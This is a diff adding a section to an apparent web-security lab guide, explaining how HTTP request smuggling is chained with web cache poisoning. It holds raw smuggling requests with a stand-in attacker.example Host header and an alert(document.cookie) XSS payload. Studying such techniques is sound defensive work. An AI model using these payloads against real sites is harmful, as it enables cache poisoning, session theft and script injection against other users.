@@ -356,3 +356,55 @@ Host: target.com
   The backend therefore processes the unsupported `GPOST` method even though the frontend only permits `GET` and `POST`.
 
 * **The Security Impact:** Obfuscating the `Transfer-Encoding` header can create HTTP request smuggling vulnerabilities when frontend and backend components normalize or interpret duplicate headers differently. Successful exploitation can allow attackers to bypass frontend security controls, inject unauthorized requests, and potentially chain the desynchronization with other attacks.
+
+  ### g. Exploiting HTTP Request Smuggling to Perform Web Cache Poisoning
+
+* **The Objective:** Exploit an HTTP request smuggling vulnerability to poison a frontend web cache so that requests for a cached JavaScript resource are redirected to an attacker-controlled server containing a malicious JavaScript payload.
+
+* **The Mechanism:** The frontend does not support chunked encoding and uses `Content-Length` to determine request boundaries, while the backend processes `Transfer-Encoding: chunked`. By smuggling a second request containing an attacker-controlled `Host` header, the attacker can cause the backend to generate a redirect to an arbitrary host. If the frontend caches the resulting response under a cacheable URL, the malicious redirect can be stored and served to subsequent users.
+
+* **Core Layout Structure:**
+
+  ```http
+  POST / HTTP/1.1
+  Host: target.com
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: [Calculated Length]
+  Transfer-Encoding: chunked
+
+  0
+
+  GET /post/next?postId=3 HTTP/1.1
+  Host: attacker.example
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 10
+
+  x=1
+  ```
+
+* **The Redirect Manipulation:** The smuggled request uses an attacker-controlled `Host` header. When the backend generates a redirect based on the requested host, the response points to the attacker's server instead of the legitimate application.
+
+* **The Cache Poisoning:** The attacker places a malicious JavaScript resource on the exploit server and then uses the smuggled request to cause the frontend cache to store the attacker-controlled redirect. A subsequent request for a cacheable JavaScript resource can then return the poisoned response.
+
+* **Core Layout Structure (Poisoned Resource):**
+
+  ```http
+  GET /resources/js/tracking.js HTTP/1.1
+  Host: target.com
+  Connection: close
+  ```
+
+  The poisoned cache causes this request to return a redirect to the attacker-controlled server instead of the legitimate JavaScript resource.
+
+* **The JavaScript Payload:** The attacker-controlled resource contains:
+
+  ```javascript
+  alert(document.cookie)
+  ```
+
+  When a victim loads the poisoned JavaScript resource, the redirect causes their browser to retrieve the malicious script from the attacker-controlled server.
+
+* **The Cache Persistence:** Once the malicious response has been successfully cached, subsequent requests for the same cache key can continue receiving the poisoned redirect. This allows the attack to affect users other than the attacker without requiring each victim to send a smuggled request.
+
+* **The Security Impact:** Combining HTTP Request Smuggling with web cache poisoning can turn a transient request desynchronization into a persistent attack. Depending on the cached resource and payload, this can result in reflected or stored XSS, session compromise, credential theft, or arbitrary JavaScript execution in other users' browsers.
+
